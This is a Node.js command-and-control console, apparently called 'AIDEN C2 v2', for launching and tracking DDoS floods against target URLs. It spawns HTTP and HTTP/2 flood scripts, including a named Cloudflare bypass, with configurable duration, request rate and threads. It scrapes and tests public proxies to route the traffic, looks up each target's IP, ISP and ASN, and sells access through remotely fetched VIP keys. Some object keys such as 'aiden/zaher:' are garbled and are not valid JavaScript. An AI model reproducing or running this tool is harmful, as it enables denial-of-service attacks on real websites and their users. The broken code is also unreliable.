#!/usr/bin/env node
const fs = require('fs').promises;
const fsSync = require('fs');
const path = require('path');
const { spawn } = require('child_process');
const readline = require('readline');
const dns = require('dns').promises;
const axios = require('axios');
const Database = require('better-sqlite3');
const chalk = require('chalk');
const boxen = require('boxen');

// ========================== CONFIGURATION ==========================
const SCRIPT_DIR = __dirname;
const PROXY_DIR = __dirname;
const DEFAULT_PROXY_FILE = 'proxy.txt';
const DB_FILE = path.join(__dirname, 'aiden/zaher_c2.db');
const LOG_FILE = path.join(__dirname, 'aiden/zaher_c2.log');

const BUILTIN_METHODS = {
  aiden/zaher: { file: 'aiden/zaher.js', description: 'Standard HTTP flood with random headers', category: 'VIP' },
  aiden/zaherH2: { file: 'aiden/zaherH2.js', description: 'HTTP/2 multiplexed flood', category: 'normal' },
  cfaiden/zaher: { file: 'cfaiden/zaher.js', description: 'Cloudflare bypass using dynamic headers', category: 'VIP' },
  ntsecdos: { file: 'ntsecdos.js', description: 'NTSEC DOS attack – high packet rate', category: 'normal' }
};

const VIP_KEY_URL = 'https://raw.githubusercontent.com/Vavannak/key/refs/heads/main/key.txt';

let currentUser = null;
let validVipKeys = new Set();
let currentUserId = null;

const VIP_LIMITS = {
  maxTime: 3600,
  maxRps: 5000,
  maxThreads: 200,
  maxConcurrent: 5
};

if (!fsSync.existsSync(path.join(PROXY_DIR, DEFAULT_PROXY_FILE))) {
  fsSync.writeFileSync(path.join(PROXY_DIR, DEFAULT_PROXY_FILE), '');
}

function log(level, message) {
  const entry = `[${new Date().toISOString()}] [${level.toUpperCase()}] ${message}`;
  fsSync.appendFileSync(LOG_FILE, entry + '\n');
  if (level === 'error') console.error(chalk.red(entry));
  else if (level === 'warn') console.error(chalk.yellow(entry));
}

// ========================== DATABASE ==========================
let db;
try {
  db = new Database(DB_FILE);
  db.exec(`
    CREATE TABLE IF NOT EXISTS history (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      method TEXT NOT NULL,
      target TEXT NOT NULL,
      time INTEGER NOT NULL,
      rps INTEGER NOT NULL,
      threads INTEGER NOT NULL,
      proxy_file TEXT,
      status TEXT NOT NULL,
      started_at INTEGER NOT NULL,
      ended_at INTEGER
    );
  `);
} catch (err) {
  console.error(chalk.red(`Failed to initialize database: ${err.message}`));
  process.exit(1);
}

function addHistory(entry) {
  const stmt = db.prepare(`
    INSERT INTO history (method, target, time, rps, threads, proxy_file, status, started_at)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
  `);
  return stmt.run(entry.method, entry.target, entry.time, entry.rps, entry.threads, entry.proxy_file, entry.status, entry.started_at).lastInsertRowid;
}

function updateHistory(id, endedAt, status) {
  db.prepare('UPDATE history SET ended_at = ?, status = ? WHERE id = ?').run(endedAt, status, id);
}

function getHistory(limit = 20) {
  return db.prepare('SELECT * FROM history ORDER BY started_at DESC LIMIT ?').all(limit);
}

// ========================== ATTACK MANAGER ==========================
class AttackManager {
  constructor() {
    this.attacks = new Map();
    this.nextId = 1;
    this.refreshInterval = null;
  }

  add(attack) {
    const id = this.nextId++;
    this.attacks.set(id, { ...attack, id, startTime: Date.now() });
    return id;
  }

  get(id) {
    return this.attacks.get(id);
  }

  delete(id) {
    return this.attacks.delete(id);
  }

  list() {
    return Array.from(this.attacks.values());
  }

  stopAll() {
    for (const attack of this.attacks.values()) {
      try { attack.child.kill(); } catch (e) {}
    }
    this.attacks.clear();
  }

  startAutoRefresh() {
    if (this.refreshInterval) clearInterval(this.refreshInterval);
    this.refreshInterval = setInterval(() => {
      if (this.attacks.size > 0) displayAttacks();
    }, 1000);
  }

  stopAutoRefresh() {
    if (this.refreshInterval) {
      clearInterval(this.refreshInterval);
      this.refreshInterval = null;
    }
  }
}

const attackManager = new AttackManager();

// ========================== LOAD VIP KEYS ==========================
async function loadVipKeys() {
  try {
    const response = await axios.get(VIP_KEY_URL, { timeout: 10000 });
    const data = response.data;
    const lines = data.split(/\r?\n/);
    validVipKeys.clear();
    for (const line of lines) {
      const key = line.trim();
      if (key && !key.startsWith('#')) {
        validVipKeys.add(key);
      }
    }
    console.log(chalk.green(`✅ Loaded ${validVipKeys.size} valid key(s) from remote.`));
    log('info', `Loaded ${validVipKeys.size} keys`);
  } catch (err) {
    console.log(chalk.red(`❌ Failed to load keys from ${VIP_KEY_URL}: ${err.message}`));
    log('error', `Failed to load keys: ${err.message}`);
  }
}

// ========================== PROXY FUNCTIONS ==========================
async function scrapeProxies(progressCallback, outputFile) {
  const sources = [
    'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
    'https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt'
  ];
  let allProxies = new Set();
  let processed = 0;
  for (const url of sources) {
    try {
      const { data } = await axios.get(url, { timeout: 15000 });
      const proxies = data.split(/\r?\n/).filter(line => line.trim() && line.includes(':'));
      proxies.forEach(p => allProxies.add(p.trim()));
      processed++;
      if (progressCallback) progressCallback(processed, sources.length, allProxies.size);
    } catch (err) {
      log('warn', `Proxy source failed: ${url} - ${err.message}`);
    }
  }
  const proxyList = Array.from(allProxies);
  await fs.writeFile(outputFile, proxyList.join('\n'), 'utf8');
  return proxyList.length;
}

async function checkProxyFile(inputFile, outputFile, progressCallback) {
  const content = await fs.readFile(inputFile, 'utf8');
  const proxies = content.split(/\r?\n/).filter(l => l.trim() && l.includes(':'));
  const total = proxies.length;
  let alive = 0;
  let dead = 0;
  const aliveProxies = [];

  const checkProxy = async (proxy) => {
    const [host, port] = proxy.split(':');
    const tester = axios.create({
      baseURL: 'http://httpbin.org/ip',
      timeout: 5000,
      proxy: { host, port, protocol: 'http' }
    });
    try {
      await tester.get('/ip');
      aliveProxies.push(proxy);
      alive++;
    } catch {
      dead++;
    }
    if (progressCallback) progressCallback(alive, dead, total);
  };

  const chunkSize = 20;
  for (let i = 0; i < proxies.length; i += chunkSize) {
    const chunk = proxies.slice(i, i + chunkSize);
    await Promise.all(chunk.map(p => checkProxy(p)));
  }
  await fs.writeFile(outputFile, aliveProxies.join('\n'), 'utf8');
  return { alive, dead, total };
}

// ========================== TARGET INFO ==========================
async function getTargetInfo(targetUrl) {
  try {
    const url = new URL(targetUrl);
    const hostname = url.hostname;
    const port = url.port || (url.protocol === 'https:' ? 443 : 80);
    let ip = hostname;
    if (!/^[\d.]+$/.test(hostname)) {
      const addresses = await dns.lookup(hostname);
      ip = addresses.address;
    }
    let asn = 'N/A', isp = 'N/A', country = 'N/A', org = 'N/A';
    try {
      const resp = await axios.get(`http://ip-api.com/json/${ip}`, { timeout: 3000 });
      if (resp.data && resp.data.status === 'success') {
        asn = resp.data.as || 'N/A';
        isp = resp.data.isp || 'N/A';
        country = resp.data.country || 'N/A';
        org = resp.data.org || 'N/A';
      }
    } catch (e) {}
    return { hostname, ip, port, asn, isp, country, org };
  } catch (err) {
    throw new Error(`Invalid target: ${err.message}`);
  }
}

// ========================== METHOD HANDLING ==========================
function getAllMethods() {
  const methods = {};
  for (const [name, info] of Object.entries(BUILTIN_METHODS)) {
    methods[name] = info.file;
  }
  return methods;
}

function getScriptPath(method) {
  const allMethods = getAllMethods();
  const fileName = allMethods[method];
  if (!fileName) return null;
  return path.join(SCRIPT_DIR, fileName);
}

function validateAttackParams(method, target, time, rps, threads, proxyFile, userRole) {
  if (userRole !== 'vip') return `❌ Not authenticated. Please login.`;
  const allMethods = getAllMethods();
  if (!allMethods[method]) {
    return `❌ Invalid method. Available: ${Object.keys(allMethods).join(', ')}`;
  }
  try { new URL(target); } catch { return `❌ Invalid URL: ${target}`; }
  
  const t = parseInt(time);
  if (isNaN(t) || t <= 0) return `❌ Time must be a positive number (seconds).`;
  if (t > VIP_LIMITS.maxTime) return `❌ Time cannot exceed ${VIP_LIMITS.maxTime}s.`;
  
  const r = parseInt(rps);
  if (isNaN(r) || r <= 0) return `❌ RPS must be a positive number.`;
  if (r > VIP_LIMITS.maxRps) return `❌ RPS cannot exceed ${VIP_LIMITS.maxRps}.`;
  
  const th = parseInt(threads);
  if (isNaN(th) || th <= 0) return `❌ Threads must be a positive number.`;
  if (th > VIP_LIMITS.maxThreads) return `❌ Threads cannot exceed ${VIP_LIMITS.maxThreads}.`;
  
  const proxyPath = proxyFile ? path.join(PROXY_DIR, proxyFile) : path.join(PROXY_DIR, DEFAULT_PROXY_FILE);
  if (!fsSync.existsSync(proxyPath)) return `❌ Proxy file not found: ${proxyFile || DEFAULT_PROXY_FILE}`;
  
  return null;
}

// ========================== DISPLAY (LIVE TABLE + DETAILS) ==========================
function formatDuration(sec) {
  if (sec < 60) return `${sec}s`;
  const mins = Math.floor(sec / 60);
  const remainSec = sec % 60;
  return `${mins}m ${remainSec}s`;
}

function displayAttacks() {
  const attacks = attackManager.list();
  if (attacks.length === 0) {
    console.clear();
    console.log(chalk.cyan('\n  📭 No active attacks.\n'));
    return;
  }
  const now = Date.now();
  const rows = attacks.map((a, idx) => {
    const elapsed = Math.floor((now - a.startTime) / 1000);
    const duration = a.time;
    const rem = Math.max(0, duration - elapsed);
    const remaining = formatDuration(rem);
    let progress = Math.floor((elapsed / duration) * 100);
    progress = Math.min(100, Math.max(0, progress));
    const barLen = 20;
    let filled = Math.floor((progress / 100) * barLen);
    filled = Math.min(barLen, Math.max(0, filled));
    const progressBar = '[' + '█'.repeat(filled) + '░'.repeat(barLen - filled) + ']';
    const progressText = `${progress}%`;
    const ipShort = a.ip.length > 15 ? a.ip.substring(0, 12) + '...' : a.ip;
    return {
      ID: a.id,
      Method: a.method,
      Target: a.targetHost || a.target.slice(0, 20),
      IP: ipShort,
      Elapsed: formatDuration(elapsed),
      Remaining: remaining,
      Progress: `${progressText} ${progressBar}`
    };
  });
  console.clear();
  console.log(chalk.whiteBright(`\n  ╔══════════════════════════════════════════════════════════════════════════════════╗`));
  console.log(chalk.whiteBright(`  ║                              ACTIVE ATTACKS (${attacks.length})                                      ║`));
  console.log(chalk.whiteBright(`  ╚══════════════════════════════════════════════════════════════════════════════════╝`));
  console.table(rows);
  
  console.log(chalk.whiteBright('\n  📋 ATTACK DETAILS (ASN, ISP, Country, Port):\n'));
  for (const a of attacks) {
    console.log(chalk.cyan(`  Attack #${a.id} (${a.method} on ${a.targetHost})`));
    console.log(`    IP: ${a.ip}`);
    console.log(`    ASN: ${a.asn}`);
    console.log(`    ISP: ${a.isp}`);
    console.log(`    Country: ${a.country}`);
    console.log(`    Organization: ${a.org}`);
    console.log(`    Port: ${a.port}\n`);
  }
  
  console.log(chalk.dim(`  Last update: ${new Date().toLocaleTimeString()}`));
  console.log(chalk.dim(`  Use "stop <id>" to stop an attack.`));
}

// ========================== LAUNCH ATTACK ==========================
function canLaunchConcurrent(userId) {
  const userAttacks = attackManager.list().filter(a => a.userId === userId).length;
  return userAttacks < VIP_LIMITS.maxConcurrent;
}

async function launchAttack(method, target, time, rps, threads, proxyFile, userId) {
  if (!canLaunchConcurrent(userId)) {
    console.log(chalk.red(`❌ You have reached your concurrent attack limit (${VIP_LIMITS.maxConcurrent}). Stop an existing attack first.`));
    return null;
  }

  const proxyPath = proxyFile ? path.join(PROXY_DIR, proxyFile) : path.join(PROXY_DIR, DEFAULT_PROXY_FILE);
  const scriptPath = getScriptPath(method);
  if (!scriptPath) {
    console.log(chalk.red(`❌ Method script not found for: ${method}`));
    return null;
  }

  let targetInfo;
  try {
    targetInfo = await getTargetInfo(target);
  } catch (err) {
    console.log(chalk.red(`❌ ${err.message}`));
    return null;
  }

  const attackTime = parseInt(time);
  
  const args = [target, attackTime, rps, threads, proxyPath];
  const child = spawn('node', [scriptPath, ...args], {
    cwd: SCRIPT_DIR,
    stdio: ['ignore', 'pipe', 'pipe'],
    env: { ...process.env, NODE_NO_WARNINGS: '1' }
  });

  const attackId = attackManager.add({
    pid: child.pid,
    method,
    target,
    targetHost: targetInfo.hostname,
    ip: targetInfo.ip,
    port: targetInfo.port,
    asn: targetInfo.asn,
    isp: targetInfo.isp,
    country: targetInfo.country,
    org: targetInfo.org,
    time: attackTime,
    rps: parseInt(rps),
    threads: parseInt(threads),
    proxyFile: proxyFile || DEFAULT_PROXY_FILE,
    child,
    startTime: Date.now(),
    userId
  });

  const historyId = addHistory({
    method, target, time: attackTime, rps: parseInt(rps), threads: parseInt(threads),
    proxy_file: proxyFile || DEFAULT_PROXY_FILE, status: 'running', started_at: Date.now()
  });

  const content = `
${chalk.bold.cyan('TARGET')}    : ${chalk.white(target)}
${chalk.bold.cyan('IP')}        : ${chalk.white(targetInfo.ip)}
${chalk.bold.cyan('ASN')}       : ${chalk.white(targetInfo.asn)}
${chalk.bold.cyan('ISP')}       : ${chalk.white(targetInfo.isp)}
${chalk.bold.cyan('COUNTRY')}   : ${chalk.white(targetInfo.country)}
${chalk.bold.cyan('ORG')}       : ${chalk.white(targetInfo.org)}
${chalk.bold.cyan('PORT')}      : ${chalk.white(targetInfo.port + ' (HTTPS – default)')}
  `;
  console.log(boxen(content, {
    padding: 1,
    margin: 1,
    borderColor: 'cyan',
    borderStyle: 'round',
    title: '🎯 TARGET INFORMATION',
    titleAlignment: 'center'
  }));

  console.log(chalk.green(`\n[SYSTEM] > Attack launched with ID: ${attackId}`));
  console.log(chalk.green(`⏱️  Attack will stop automatically after ${attackTime} seconds.`));

  child.stdout.on('data', (data) => log('info', `[${attackId}] stdout: ${data.toString().trim()}`));
  child.stderr.on('data', (data) => {
    const errMsg = data.toString();
    if (errMsg.includes('DeprecationWarning') || errMsg.includes('url.parse()')) return;
    log('error', `[${attackId}] stderr: ${errMsg.trim()}`);
  });

  setTimeout(() => {
    const a = attackManager.get(attackId);
    if (a) try { a.child.kill(); } catch(e) {}
  }, (attackTime + 2) * 1000);

  child.on('exit', (code, signal) => {
    const a = attackManager.get(attackId);
    if (!a) return;
    const duration = Math.round((Date.now() - a.startTime) / 1000);
    const status = code === 0 ? 'completed' : `crashed (${code || signal})`;
    updateHistory(historyId, Date.now(), status);
    console.log(chalk.yellow(`\n[SYSTEM] > Attack ${attackId} finished. Duration: ${duration}s, Status: ${status}`));
    attackManager.delete(attackId);
    displayAttacks();
  });

  displayAttacks();
  return attackId;
}

// ========================== COMMAND HANDLERS ==========================
const commands = {};

function requireLogin() {
  if (!currentUser) {
    console.log(chalk.red('❌ You are not logged in. Use "login <key>" to authenticate.'));
    return false;
  }
  return true;
}

commands.login = async (args) => {
  if (args.length === 0) {
    console.log(chalk.red('Usage: login <key>'));
    return;
  }
  const key = args[0];
  if (validVipKeys.has(key)) {
    currentUser = 'vip';
    currentUserId = key;
    console.log(chalk.green('✅ Login successful. You have VIP access with standard limits.'));
    return;
  }
  console.log(chalk.red('❌ Invalid key. Access denied.'));
};

commands.help = () => {
  if (!currentUser) {
    console.log(chalk.whiteBright(`
╔══════════════════════════════════════════════════════════════╗
║                     aiden/zaher C2 - LOGIN REQUIRED                ║
╠══════════════════════════════════════════════════════════════╣
║ login <key>             – Authenticate with your VIP key     ║
║ help                    – Show this message                  ║
║ exit / quit             – Exit the tool                      ║
╚══════════════════════════════════════════════════════════════╝
`));
    return;
  }
  console.log(chalk.whiteBright(`
╔══════════════════════════════════════════════════════════════╗
║                     aiden/zaher C2 COMMANDS                        ║
╠══════════════════════════════════════════════════════════════╣
║ attack <method> <url> <time> <rps> <threads> [proxy]         ║
║   → Launch DDoS attack (shows full target details)          ║
║ list / ls                    → Show active attacks with details║
║ stop <id>                    → Stop a specific attack        ║
║ history                      → Show last 20 attacks          ║
║ methods                      → Show available methods        ║
║ scrape                       → Fetch fresh proxies           ║
║ checkproxy [filename]        → Test proxies, save checked_*  ║
║ listproxies                  → Show all proxy files          ║
║ clear / cls                  → Clear screen                  ║
║ logout                       → Log out from current session  ║
║ exit / quit                  → Stop all attacks and exit     ║
╚══════════════════════════════════════════════════════════════╝
`));
};

commands.attack = async (args) => {
  if (!requireLogin()) return;
  if (args.length < 5) {
    console.log(chalk.red('Usage: attack <method> <url> <time> <rps> <threads> [proxyfile]'));
    return;
  }
  let [method, target, time, rps, threads, proxyFile] = args;
  const err = validateAttackParams(method, target, time, rps, threads, proxyFile, currentUser);
  if (err) { console.log(chalk.red(err)); return; }
  await launchAttack(method, target, time, rps, threads, proxyFile, currentUserId);
};

commands.list = commands.ls = () => {
  if (!requireLogin()) return;
  displayAttacks();
};

commands.stop = async (args) => {
  if (!requireLogin()) return;
  if (args.length === 0) { console.log(chalk.red('Usage: stop <attack_id>')); return; }
  const id = parseInt(args[0]);
  const attack = attackManager.get(id);
  if (!attack) { console.log(chalk.red(`No active attack with ID ${id}`)); return; }
  if (attack.userId !== currentUserId) {
    console.log(chalk.red('❌ You can only stop your own attacks.'));
    return;
  }
  try { attack.child.kill(); } catch(e) {}
  const duration = Math.round((Date.now() - attack.startTime) / 1000);
  console.log(chalk.yellow(`🛑 Attack ${id} stopped after ${duration}s`));
  attackManager.delete(id);
  displayAttacks();
};

commands.history = () => {
  if (!requireLogin()) return;
  const history = getHistory(20);
  if (history.length === 0) {
    console.log(chalk.dim('No attack history found.'));
    return;
  }
  console.log(chalk.whiteBright('\n  📜 LAST 20 ATTACKS\n'));
  for (const h of history) {
    const start = new Date(h.started_at).toLocaleString();
    const end = h.ended_at ? new Date(h.ended_at).toLocaleString() : 'N/A';
    const statusColor = h.status === 'completed' ? 'green' : 'red';
    console.log(chalk.cyan(`  ${h.method} on ${h.target}`));
    console.log(`    Time: ${h.time}s | RPS: ${h.rps} | Threads: ${h.threads}`);
    console.log(`    Started: ${start}`);
    console.log(`    Ended: ${end}`);
    console.log(chalk[statusColor](`    Status: ${h.status}\n`));
  }
};

commands.methods = () => {
  if (!requireLogin()) return;
  console.log(chalk.whiteBright('\n  📋 AVAILABLE METHODS\n'));
  for (const [method, info] of Object.entries(BUILTIN_METHODS)) {
    const tag = info.category === 'VIP' ? chalk.green('[VIP]') : chalk.yellow('[normal]');
    console.log(`  ${chalk.cyan(method)}: ${info.description} ${tag}`);
  }
  console.log(chalk.dim('\n  Only these four methods are available.\n'));
};

commands.scrape = async () => {
  if (!requireLogin()) return;
  console.log(chalk.cyan('🔄 Starting proxy scraper...'));
  const outputPath = path.join(PROXY_DIR, DEFAULT_PROXY_FILE);
  let lastMsg = '';
  const progress = (processed, total, found) => {
    const msg = `Processed ${processed}/${total} sources, found ${found} proxies`;
    if (msg !== lastMsg) { console.log(msg); lastMsg = msg; }
  };
  try {
    const count = await scrapeProxies(progress, outputPath);
    console.log(chalk.green(`✅ Scraping complete! ${count} unique proxies saved to ${DEFAULT_PROXY_FILE}`));
  } catch (err) {
    console.log(chalk.red(`❌ Scraping failed: ${err.message}`));
  }
};

commands.checkproxy = async (args) => {
  if (!requireLogin()) return;
  let inputFile = args[0] || DEFAULT_PROXY_FILE;
  const inputPath = path.join(PROXY_DIR, inputFile);
  if (!fsSync.existsSync(inputPath)) {
    console.log(chalk.red(`File ${inputFile} not found.`));
    return;
  }
  const parsed = path.parse(inputFile);
  const outputFile = `${parsed.name}_checked${parsed.ext}`;
  const outputPath = path.join(PROXY_DIR, outputFile);
  console.log(chalk.cyan(`🔍 Checking proxies in ${inputFile}...`));
  let lastUpdate = '';
  const progress = (alive, dead, total) => {
    const msg = `Checked: ${alive + dead}/${total} | Alive: ${alive} | Dead: ${dead}`;
    if (msg !== lastUpdate) { console.log(msg); lastUpdate = msg; }
  };
  try {
    const { alive, dead, total } = await checkProxyFile(inputPath, outputPath, progress);
    console.log(chalk.green(`✅ Check complete! Total: ${total} | Alive: ${alive} | Dead: ${dead}`));
    console.log(chalk.cyan(`📁 Saved to ${outputFile}`));
  } catch (err) {
    console.log(chalk.red(`Error: ${err.message}`));
  }
};

commands.listproxies = async () => {
  if (!requireLogin()) return;
  const files = await fs.readdir(PROXY_DIR);
  const proxyFiles = files.filter(f => f.endsWith('.txt') && f !== 'aiden/zaher_c2.db' && f !== 'aiden/zaher_c2.log');
  if (proxyFiles.length === 0) {
    console.log(chalk.dim('No proxy files found.'));
    return;
  }
  console.log(chalk.whiteBright('📋 Available proxy files:'));
  for (const file of proxyFiles) {
    const stat = await fs.stat(path.join(PROXY_DIR, file));
    const lines = (await fs.readFile(path.join(PROXY_DIR, file), 'utf8')).split('\n').filter(l => l.trim()).length;
    console.log(`  📄 ${chalk.cyan(file)} – ${lines} proxies, ${(stat.size / 1024).toFixed(1)} KB`);
  }
};

commands.clear = commands.cls = () => console.clear();
commands.logout = () => {
  if (!currentUser) {
    console.log(chalk.yellow('Not logged in.'));
    return;
  }
  currentUser = null;
  currentUserId = null;
  console.log(chalk.yellow('Logged out.'));
};
commands.exit = commands.quit = () => {
  console.log(chalk.yellow('Shutting down... Stopping all attacks.'));
  attackManager.stopAll();
  attackManager.stopAutoRefresh();
  process.exit(0);
};

// ========================== INITIALIZATION ==========================
(async () => {
  console.clear();
  console.log(chalk.magenta(`
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║     █████╗    █████╗    ██████╗    ███████╗   ███╗   ██╗     ║
║    ██╔══██╗    ██║     ██╔══██╗   ██╔════╝   ████╗  ██║     ║
║    ███████║    ██║     ██║  ██║   █████╗     ██╔██╗ ██║     ║
║    ██╔══██║    ██║     ██║  ██║   ██╔══╝     ██║╚██╗██║     ║
║    ██║  ██║   █████╗   ██████╝    ███████╗   ██║ ╚████║     ║
║    ╚═╝  ╚═╝   ╚════╝   ╚═════╝    ╚══════╝   ╚═╝  ╚═══╝     ║
║                                                              ║
║              AIDEN C2 v2 - PROFESSIONAL                      ║
║   Type "help" to get started | "login <key>" to authenticate ║
╚══════════════════════════════════════════════════════════════╝
`));
  await loadVipKeys();
  attackManager.startAutoRefresh();
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
    prompt: chalk.bold.white.bgMagenta(' aiden/zaher C2 > ')
  });
  rl.prompt();
  rl.on('line', async (line) => {
    const trimmed = line.trim();
    if (!trimmed) { rl.prompt(); return; }
    const [cmd, ...args] = trimmed.split(/\s+/);
    const handler = commands[cmd.toLowerCase()];
    if (handler) {
      try {
        await handler(args);
      } catch (err) {
        console.log(chalk.red(`Error: ${err.message}`));
        log('error', err.stack);
      }
    } else {
      console.log(chalk.red(`Unknown command: ${cmd}. Type "help" for available commands.`));
    }
    rl.prompt();
  }).on('close', () => commands.exit());
})();
